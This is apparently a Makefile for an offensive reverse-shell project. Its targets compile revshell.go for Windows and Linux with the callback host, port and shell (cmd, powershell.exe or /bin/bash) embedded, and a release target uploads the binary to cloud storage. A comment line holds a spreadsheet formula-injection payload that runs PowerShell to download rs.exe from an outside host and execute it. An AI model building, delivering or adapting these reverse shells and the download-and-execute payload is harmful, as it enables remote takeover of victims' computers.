include .env
export

## =cmd|' /C powershell Invoke-WebRequest "http://somehost/rs.exe" -OutFile "$env:Temp\rs.exe"; Start-Process "$env:Temp\rs.exe"'!A1

.PHONY: build

release: build
	gsutil cp $(EXE) $(RS_GCS_URL)

build:
	GOOS=windows GOARCH=amd64 go build --ldflags "-X main.connectionString=$(RS_HOST):$(RS_PORT) -X main.command=$(COMMAND)" -o $(EXE) revshell.go

build-powershell:
	GOOS=windows GOARCH=amd64 go build --ldflags "-X main.connectionString=$(RS_HOST):$(RS_PORT) -X main.command=powershell.exe" -o rs-ps.exe revshell.go

build-native:
	go build --ldflags "-X main.connectionString=$(RS_HOST):$(RS_PORT) -X main.command=/bin/bash" -o revshell revshell.go

build-linux:
	GOOS=linux go build --ldflags "-X main.connectionString=$(RS_HOST):$(RS_PORT) -X main.command=/bin/bash" -o revshell-linux revshell.go
